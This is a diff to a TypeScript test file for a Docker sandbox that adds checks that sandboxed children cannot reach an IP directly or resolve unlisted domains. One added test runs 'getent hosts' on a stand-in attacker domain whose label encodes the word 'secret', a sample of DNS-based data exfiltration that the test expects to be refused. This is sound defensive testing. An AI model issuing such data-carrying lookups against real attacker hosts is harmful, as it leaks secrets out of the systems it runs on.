@@ -3,6 +3,7 @@ import type { AddressInfo } from 'node:net'
 
 import { afterAll, beforeAll, describe, expect, it } from 'vitest'
 
+import { expectSmallRecipe } from './provider-recipe'
 import { dockerSandboxProvider, removeStaleSandboxes } from './docker-sandbox'
 import { createIsolatedSandbox, type IsolatedSandbox } from './sandbox'
 
@@ -109,21 +110,17 @@ describe('the docker sandbox', () => {
   // route and the resolver of the sandbox must do the same.
   const bare = (command: string) => `env -i PATH="$PATH" HOME="$HOME" ${command}`
 
-  it('lets a child with only PATH and HOME fetch an allowed domain, and refuses one that is not', async () => {
-    const fetched = await sh(
-      bare(
-        `node -e "fetch('https://registry.npmjs.org/left-pad').then(r => console.log(r.status), e => console.log('refused'))"`,
-      ),
-    )
-    expect(fetched.stdout.trim()).toBe('200')
-    const refused = await sh(
-      bare(
-        `node -e "fetch('https://example.com').then(r => console.log(r.status), e => console.log('refused'))"`,
-      ),
-    )
-    expect(refused.stdout.trim()).not.toBe('200')
+  it('runs the small recipe every provider runs: children with a bare environment, and the declared pnpm', async () => {
+    await expectSmallRecipe((command) => sh(command, 120_000))
+  }, 240_000)
+
+  it('refuses a connection by address and a name that is not allowed, so nothing leaves through DNS or an IP', async () => {
     const direct = await sh(bare('curl -s -m 8 -k https://1.1.1.1/ -o /dev/null; echo $?'))
     expect(direct.stdout.trim()).not.toBe('0')
+    // The proxy answers REFUSED for a name the rules do not list, so a name that carries data resolves nowhere.
+    const unlisted = await sh(bare('getent hosts c2VjcmV0.attacker.example; echo $?'))
+    expect(unlisted.stdout.trim()).toBe('2')
+    expect((await sh(bare('getent hosts registry.npmjs.org'))).exitCode).toBe(0)
   }, 120_000)
 
   it('gives a child that drops the environment the same package manager cache and Node headers', async () => {
